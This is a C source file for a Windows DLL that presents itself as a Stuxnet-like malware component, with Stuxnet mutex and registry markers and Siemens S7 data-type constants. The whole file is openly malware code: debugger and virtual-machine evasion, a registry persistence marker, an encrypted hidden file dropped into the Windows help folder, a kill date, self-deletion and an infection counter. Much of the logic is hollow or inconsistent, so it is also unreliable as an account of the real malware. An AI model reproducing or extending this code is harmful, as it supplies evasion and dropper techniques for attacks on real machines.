#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WINMIC_MAGIC                    0x57494E4D
#define WINMIC_VERSION                  0x00010400
#define WINMIC_FILE_SIZE                25
#define WINMIC_MAX_PATH                 260
#define WINMIC_BUFFER_SIZE              4096

#define WINMIC_REG_KEY                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WINMIC_REG_VALUE                L"19790509"

#define WINMIC_DATA_TYPE_S7_CONFIG      0x0001
#define WINMIC_DATA_TYPE_S7_PASSWORD    0x0002
#define WINMIC_DATA_TYPE_S7_PROJECT     0x0003
#define WINMIC_DATA_TYPE_S7_NETWORK     0x0004
#define WINMIC_DATA_TYPE_S7_PLC         0x0005
#define WINMIC_DATA_TYPE_S7_DB          0x0006
#define WINMIC_DATA_TYPE_S7_OB          0x0007
#define WINMIC_DATA_TYPE_S7_FC          0x0008
#define WINMIC_DATA_TYPE_S7_FB          0x0009
#define WINMIC_DATA_TYPE_S7_SDB         0x000A
#define WINMIC_DATA_TYPE_S7_SFC         0x000B
#define WINMIC_DATA_TYPE_S7_SFB         0x000C
#define WINMIC_DATA_TYPE_S7_PI          0x000D
#define WINMIC_DATA_TYPE_S7_PQ          0x000E
#define WINMIC_DATA_TYPE_S7_M           0x000F
#define WINMIC_DATA_TYPE_S7_T           0x0010
#define WINMIC_DATA_TYPE_S7_C           0x0011
#define WINMIC_DATA_TYPE_S7_Z           0x0012

#define WINMIC_DATA_FLAG_ENCRYPTED      0x00000001
#define WINMIC_DATA_FLAG_COMPRESSED     0x00000002
#define WINMIC_DATA_FLAG_SIGNED         0x00000004
#define WINMIC_DATA_FLAG_CHECKSUM       0x00000008
#define WINMIC_DATA_FLAG_VALID          0x00000010
#define WINMIC_DATA_FLAG_ACTIVE         0x00000020
#define WINMIC_DATA_FLAG_PENDING        0x00000040
#define WINMIC_DATA_FLAG_COMPLETE       0x00000080
#define WINMIC_DATA_FLAG_ERROR          0x00000100

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _WINMIC_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwDataSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} WINMIC_HEADER, * PWINMIC_HEADER;

typedef struct _WINMIC_DATA {
    DWORD dwType;
    DWORD dwFlags;
    DWORD dwSize;
    BYTE bData[1];
} WINMIC_DATA, * PWINMIC_DATA;

typedef struct _WINMIC_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WINMIC_MAX_PATH];
    WCHAR szSystemPath[WINMIC_MAX_PATH];
    WCHAR szWindowsPath[WINMIC_MAX_PATH];
    WCHAR szHelpPath[WINMIC_MAX_PATH];
    WCHAR szFtsPath[WINMIC_MAX_PATH];
    BYTE bReserved[256];
} WINMIC_CTX, * PWINMIC_CTX;

static WINMIC_CTX g_WinmicCtx;
static BOOL g_bInitialized = FALSE;
static BYTE g_EncryptionKey[32] = {
    0x4C, 0x2B, 0x1D, 0x0A, 0x7E, 0xD1, 0x6C, 0x37,
    0x1A, 0x4D, 0x62, 0x09, 0xC4, 0x3F, 0x0B, 0x06,
    0x71, 0x1E, 0x5A, 0x2F, 0xA2, 0x3D, 0x08, 0x43,
    0x6F, 0x0C, 0x59, 0x06, 0x2E, 0x85, 0x1B, 0xC0
};

static BYTE g_WinmicData[WINMIC_FILE_SIZE] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18
};

static DWORD g_dwInfectionCount = 0;
static DWORD g_dwReadCount = 0;
static DWORD g_dwWriteCount = 0;
static DWORD g_dwDecryptCount = 0;
static DWORD g_dwEncryptCount = 0;

static BOOL WINMIC_InitNtImports(VOID);
static BOOL WINMIC_Init(VOID);
static VOID WINMIC_Cleanup(VOID);
static BOOL WINMIC_CheckMutex(VOID);
static BOOL WINMIC_IsExpired(VOID);
static BOOL WINMIC_CheckDebugger(VOID);
static BOOL WINMIC_CheckVMware(VOID);
static DWORD WINMIC_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID WINMIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID WINMIC_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID WINMIC_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID WINMIC_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID WINMIC_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL WINMIC_DecryptFts(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize);
static BOOL WINMIC_EncryptFts(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL WINMIC_ReadFtsFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL WINMIC_WriteFtsToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL WINMIC_ReadFtsFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL WINMIC_WriteRegistry(VOID);
static BOOL WINMIC_ReadRegistry(VOID);
static BOOL WINMIC_ExtractAndSaveFts(VOID);
static DWORD WINAPI WINMIC_WorkerThread(LPVOID lpParam);
static BOOL WINMIC_StartWorker(VOID);
static BOOL WINMIC_StopWorker(VOID);
static BOOL WINMIC_SelfDestruct(VOID);
static BOOL WINMIC_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL WINMIC_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL WINMIC_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_WinmicCtx, sizeof(WINMIC_CTX));
    g_WinmicCtx.dwMagic = WINMIC_MAGIC;
    g_WinmicCtx.dwVersion = WINMIC_VERSION;
    g_WinmicCtx.dwPid = GetCurrentProcessId();
    g_WinmicCtx.dwTid = GetCurrentThreadId();
    g_WinmicCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_WinmicCtx.csLock);
    GetModuleFileNameW(NULL, g_WinmicCtx.szModulePath, WINMIC_MAX_PATH);
    GetSystemDirectoryW(g_WinmicCtx.szSystemPath, WINMIC_MAX_PATH);
    GetWindowsDirectoryW(g_WinmicCtx.szWindowsPath, WINMIC_MAX_PATH);
    wsprintfW(g_WinmicCtx.szHelpPath, L"%s\\help", g_WinmicCtx.szWindowsPath);
    wsprintfW(g_WinmicCtx.szFtsPath, L"%s\\winmic.fts", g_WinmicCtx.szHelpPath);
    WINMIC_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID WINMIC_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_WinmicCtx.hMutex) {
        CloseHandle(g_WinmicCtx.hMutex);
        g_WinmicCtx.hMutex = NULL;
    }
    if (g_WinmicCtx.hThread) {
        CloseHandle(g_WinmicCtx.hThread);
        g_WinmicCtx.hThread = NULL;
    }
    if (g_WinmicCtx.hStopEvent) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_WinmicCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL WINMIC_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_WinmicCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL WINMIC_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WINMIC_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WINMIC_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD WINMIC_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID WINMIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID WINMIC_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID WINMIC_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID WINMIC_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID WINMIC_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL WINMIC_DecryptFts(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    PWINMIC_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = 0x01AE0000;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(WINMIC_HEADER)) {
        return FALSE;
    }
    pHeader = (PWINMIC_HEADER)pEncrypted;
    if (pHeader->dwMagic != WINMIC_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(WINMIC_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(WINMIC_HEADER), dwDataSize);
    for (DWORD round = 0; round < 3; round++) {
        WINMIC_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        WINMIC_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        WINMIC_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        WINMIC_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    g_dwDecryptCount++;
    return TRUE;
}

static BOOL WINMIC_EncryptFts(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    PWINMIC_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = 0x01AE0000;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(WINMIC_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (PWINMIC_HEADER)pEncrypted;
    pHeader->dwMagic = WINMIC_MAGIC;
    pHeader->dwVersion = WINMIC_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwDataSize = dwDecryptedSize;
    pHeader->dwChecksum = WINMIC_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    pHeader->dwFlags = WINMIC_DATA_FLAG_ENCRYPTED | WINMIC_DATA_FLAG_CHECKSUM | WINMIC_DATA_FLAG_VALID;
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(WINMIC_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < 3; round++) {
        WINMIC_SimpleEncrypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize);
        WINMIC_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        WINMIC_RC4Crypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize, SBox, &i, &j);
        WINMIC_XORDecrypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    g_dwEncryptCount++;
    return TRUE;
}

static BOOL WINMIC_ReadFtsFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    g_dwReadCount++;
    return TRUE;
}

static BOOL WINMIC_WriteFtsToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwWriteCount++;
    return TRUE;
}

static BOOL WINMIC_ReadFtsFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(209), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL WINMIC_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WINMIC_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WINMIC_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WINMIC_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINMIC_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WINMIC_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WINMIC_ExtractAndSaveFts(VOID) {
    PBYTE pData;
    DWORD dwSize;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    BOOL bResult;
    if (!WINMIC_ReadFtsFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    dwEncryptedSize = dwSize + sizeof(WINMIC_HEADER) + 4096;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    bResult = WINMIC_EncryptFts(pData, dwSize, pEncrypted, &dwEncryptedSize);
    if (bResult) {
        bResult = WINMIC_WriteFtsToDisk(g_WinmicCtx.szFtsPath, pEncrypted, dwEncryptedSize);
    }
    HeapFree(GetProcessHeap(), 0, pData);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return bResult;
}

static DWORD WINAPI WINMIC_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_WinmicCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WINMIC_IsExpired()) {
            break;
        }
        if (!WINMIC_ReadRegistry()) {
            WINMIC_WriteRegistry();
        }
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL WINMIC_StartWorker(VOID) {
    g_WinmicCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_WinmicCtx.hStopEvent) return FALSE;
    g_WinmicCtx.hThread = CreateThread(NULL, 0, WINMIC_WorkerThread, NULL, 0, NULL);
    if (!g_WinmicCtx.hThread) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL WINMIC_StopWorker(VOID) {
    if (g_WinmicCtx.hStopEvent) {
        SetEvent(g_WinmicCtx.hStopEvent);
    }
    if (g_WinmicCtx.hThread) {
        WaitForSingleObject(g_WinmicCtx.hThread, 5000);
        CloseHandle(g_WinmicCtx.hThread);
        g_WinmicCtx.hThread = NULL;
    }
    if (g_WinmicCtx.hStopEvent) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL WINMIC_SelfDestruct(VOID) {
    DeleteFileW(g_WinmicCtx.szFtsPath);
    return TRUE;
}

static BOOL WINMIC_Execute(VOID) {
    HANDLE hMutex;
    if (!WINMIC_Init()) return FALSE;
    if (WINMIC_IsExpired()) {
        WINMIC_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    if (WINMIC_CheckDebugger()) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    if (WINMIC_CheckVMware()) {
        CloseHandle(hMutex);
        WINMIC_Cleanup();
        return FALSE;
    }
    WINMIC_WriteRegistry();
    WINMIC_ReadRegistry();
    WINMIC_ExtractAndSaveFts();
    WINMIC_StartWorker();
    while (WaitForSingleObject(g_WinmicCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WINMIC_IsExpired()) {
            break;
        }
        WINMIC_ExtractAndSaveFts();
    }
    WINMIC_StopWorker();
    WINMIC_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WINMIC_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WINMIC_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return WINMIC_ExtractAndSaveFts() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!WINMIC_ReadFtsFromDisk(g_WinmicCtx.szFtsPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    BOOL bResult;
    if (!WINMIC_ReadFtsFromDisk(g_WinmicCtx.szFtsPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    bResult = WINMIC_DecryptFts(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WINMIC_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WINMIC_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WINMIC_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    WINMIC_StopWorker();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    WINMIC_SelfDestruct();
    return 0;
}

DWORD WINAPI Export10(VOID) {
    return (DWORD)g_WinmicCtx.dwPid;
}

DWORD WINAPI Export11(VOID) {
    return WINMIC_VERSION;
}

DWORD WINAPI Export12(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export13(VOID) {
    return g_dwReadCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return g_dwDecryptCount;
}

DWORD WINAPI Export16(VOID) {
    return g_dwEncryptCount;
}

DWORD WINAPI Export17(VOID) {
    return (DWORD)g_WinmicCtx.hMutex;
}

DWORD WINAPI Export18(VOID) {
    return WINMIC_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return WINMIC_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return WINMIC_CheckVMware() ? 0 : 1;
}
